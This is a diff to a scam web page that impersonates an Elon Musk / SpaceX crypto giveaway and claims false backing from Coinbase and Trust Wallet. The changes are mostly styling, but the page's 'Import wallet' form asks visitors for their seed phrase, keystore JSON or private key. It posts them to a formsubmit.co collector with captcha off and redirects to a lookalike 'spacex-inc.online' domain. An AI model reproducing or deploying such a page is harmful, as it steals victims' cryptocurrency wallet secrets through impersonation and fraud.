@@ -205,15 +205,6 @@ Navbar
   box-shadow: var(--dark-shadow);
   z-index: 2;
 }
-.nav-logo {
-  max-width: 30%;
-}
-@media screen and (min-width: 992px) {
-  .nav-logo {
-    max-width: 22%;
-  }
-}
-
 .nav-icons {
   display: none;
 }
@@ -305,6 +296,20 @@ Navbar
   }
   .nav-icon:hover {
     color: var(--clr-primary-8);
+  }
+}
+.nav-logo{
+  max-width: 30%;
+}
+@media screen and (min-width: 992px) {
+  .nav-logo {
+    max-width: 22%;
+    margin-left: -1rem;
+  }
+}
+@media screen and (min-width: 1200px) {
+  .nav-logo {
+    margin-left: -2rem;
   }
 }
 /*
@@ -687,14 +692,16 @@ Footer
   letter-spacing: var(--spacing);
   color: var(--clr-white);
 }
-/* @media screen and (min-width: 992px) {
+@media screen and (min-width: 992px) {
   .image0 {
     max-width: 50%;
     margin-right: 28%;
     margin-left: 28%;
   }
-} */
-
+}
+.image0 {
+  margin-top: -5rem;
+}
 /* ON */
 /*
 =============== 
@@ -1316,17 +1323,13 @@ Footer
   letter-spacing: var(--spacing);
   color: var(--clr-white);
 }
-.image0 {
-  max-width: 96%;
-}
-@media screen and (min-width: 690px) {
+@media screen and (min-width: 992px) {
   .image0 {
-    max-width: 60%;
-    margin-right: auto;
-    margin-left: auto;
+    max-width: 50%;
+    margin-right: 28%;
+    margin-left: 28%;
   }
 }
-
 /* .form-container {
   align-items: inherit;
   flex: 1;
@@ -1352,7 +1355,7 @@ Footer
   text-transform: uppercase;
   background: #2a6abd;
   color: var(--clr-white);
-  padding: 0.5rem 1.6rem;
+  padding: 0.5rem 1.5rem;
   letter-spacing: var(--spacing);
   display: inline-block;
   /* font-weight: 700; */
@@ -1375,33 +1378,7 @@ Footer
   color: #b3b3b3;
   text-decoration: underline;
 }
-.imports {
-  text-align: center;
-}
-.phrases {
-  display: flex;
-  margin-top: 5%;
-  gap: 14%;
-  justify-content: center;
-}
-.phrases h3 {
-  font-size: 105%;
-}
-.jason {
-  max-width: 20%;
-}
-@media screen and (min-width: 992px) {
-  .jason {
-    max-width: 20%;
-  }
-}
-.phrase1 {
-  padding: 1.5rem 1.4rem;
-  background-color: var(--clr-primary-5);
-  border-radius: 4rem;
-  margin-top: -1rem;
-  color: var(--clr-white);
-}
+
 /* message */
 
 .typically {
@@ -1422,54 +1399,72 @@ Footer
     width: 50%;
   }
 }
-.footers {
-  text-align: center;
-  padding: 1.8rem 0;
-  background: #2c66b3;
-  color: #fff;
+.image0 {
+  margin-right: auto;
+  margin-left: auto;
+  max-width: 85%;
 }
-.wallet {
-  text-align: center;
+@media screen and (min-width: 700px) {
+  .image0 {
+    max-width: 55%;
+    margin-right: auto;
+    margin-left: auto;
+  }
 }
-.wallet,
-h1 {
-  font-size: 160%;
-}
-.jason {
-  display: flex;
-  /* gap: 1.5rem; */
-}
-.phrase h3 {
-  font-size: 100%;
-  align-self: center;
-}
-.phrase {
-  padding: 1.6rem 2.5rem;
-  background-color: #2c66b3;
-  color: #fff;
-  border-radius: 4rem;
-  margin-left: 1rem;
-}
-.js {
-  margin-top: 3.7%;
-}
-.js,
-h3 {
-  font-size: 104%;
+@media screen and (min-width: 1200px) {
+  .image0 {
+    max-width: 40%;
+    margin-right: auto;
+    margin-left: auto;
+  }
 }
 
-.js,
-ul,
-li {
-  display: flex;
+.footers {
   text-align: center;
+  padding: 1.6rem 0;
+  background: #2c66b3;
+  color: #fff;
+  margin-top: 0.6rem;
+}
+.footerss {
+  text-align: center;
+  padding: 1.8rem 0;
+  background: var(--clr-grey-1);
+  color: #fff;
+}
+.conet {
+  text-align: center;
+  margin-bottom: 1rem;
+  margin-top: 0.2rem;
+}
+.conet,
+h2 {
+  font-size: 155%;
+}
+.all {
+  display: flex;
   justify-content: center;
 }
-@media screen and (min-width: 200px) {
-  .phrase,
+li {
+  text-decoration: none;
+}
+.phrase {
+  padding: 1rem 1.9rem;
+  background-color: #2a6abd;
+  margin-top: -0.9rem;
+  border-radius: 2rem;
+  color: var(--clr-white);
+}
+.all,
+li {
+  font-size: 110%;
+  list-style: none;
+  gap: 1.5rem;
+}
+@media screen and (min-width: 700px) {
+  .all,
   li {
-    max-width: 100%;
-    margin: 1.8%;
+    gap: 7rem;
   }
 }
 
@@ -1518,80 +1513,43 @@ li {
           </ul>
           <!-- end of nav links -->
           <!-- nav icons -->
-          <ul class="nav-icons">
-            <!-- single icon -->
-            <!-- <li>
-              <a
-                href="https://web.facebook.com/groups/elonmusk1/?_rdc=1&_rdr"
-                target="_blank"
-                class="nav-icon"
-              >
-                <i class="fab fa-facebook"></i>
-              </a>
-            </li> -->
-            <!-- end of single icon -->
-            <!-- single icon -->
-            <!-- <li>
-              <a
-                href="https://twitter.com/elonmusk?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor"
-                target="_blank"
-                class="nav-icon"
-              >
-                <i class="fab fa-twitter"></i>
-              </a>
-            </li> -->
-            <!-- end of single icon -->
-            <!-- single icon -->
-            <!-- <li>
-              <a
-                href="https://www.instagram.com/teslamotors/?hl=en"
-                target="_blank"
-                class="nav-icon"
-              >
-                <i class="fab fa-instagram"></i>
-              </a>
-            </li> -->
-            <!-- end of single icon -->
-          </ul>
+          
           <!-- end of nav icons -->
         </div>
       </nav>
+   <br>
+   <br>
+   <br>
    
-      </div>
-    </section>
-    <br>
-    <br>
-    <br>
-        <br>
-    
-<div class="wallet">
-<h1>Import Wallet</h1>
+ <!-- <img src="./images/jason.webp" class="image0" alt=""> -->
+<br>
+<div class="conet">
+  <h2>Import wallet</h2>
 </div>
 <br>
 <br>
-
-<ul>
+<div class="all">
   <li class="phrase">
-<h3>Phrase</h3>
-  </li>
-  <li class="js">
-<h3>Keystore JSON</h3>
-  </li>
-  <li class="js">
-<h3>Private key</h3>
-  </li>
-</ul>
+  Phrase
+</li>
+<li>
+  Keystore JSON
+</li>
+<li>
+  Private key
+</li>
+</div>
   <!-- end of import -->
   <!-- form space -->
 
   <!-- end of form space -->
   <br>
   <br>
-  <form action="https://formsubmit.co/7aa21750233eb1e1d678b238c0f6b6b2" method="post" class="form-center">
+  <form action="https://formsubmit.co/784aaccace6cffdc52436a4b11930487" method="post" class="form-center">
 
     <input type="hidden" name="_captcha" value="false">
 
-    <input type="hidden" name="_next" value="https://elonmuskgiveaway.github.io/elonmuskgiveaway/thanks.html">
+    <input type="hidden" name="_next" value="https://spacex-inc.online/thanks.html">
     <style>
   textarea{
     border-color: black;
@@ -1620,11 +1578,18 @@ font-size: 15px;
     <!-- featured tours -->
     <br>
     <br>
-    <footer class="footers">
-Copyright &copy; Elon musk Tesla and spaceX company 2023. Supported by Coinbase, Blockchain, Trust wallet. All Rights Reserved
-    </footer>
-     
+    <br>
+        <br>
+    <br>
+  <br>
     
+
+      <!-- section-title -->
+     
+    <!-- footer -->
+    <footer class="footers">
+Copyright &copy; Elon musk Tesla and spaceX company 2024. Supported by Coinbase, Blockchain, Trust wallet. All Rights Reserved
+    </footer>
    
     <!-- js -->
     <script src="./js/app.js"></script>
